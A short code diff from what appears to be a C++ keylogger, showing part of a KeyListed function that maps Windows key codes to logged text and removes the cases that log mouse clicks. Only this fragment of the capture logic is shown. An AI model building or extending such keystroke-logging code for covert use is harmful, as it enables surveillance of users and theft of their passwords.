@@ -30,14 +30,6 @@ bool KeyListed(int Key) {
         std::cout << "\b";
         log("\b");
         break;
-    case VK_RBUTTON:
-        std::cout << " *rclick* ";
-        log(" *rclick* ");
-        break;
-    case VK_LBUTTON:
-        std::cout << " *lclick* ";
-        log(" *lclick* ");
-        break;
     default: return false;
     }
 }
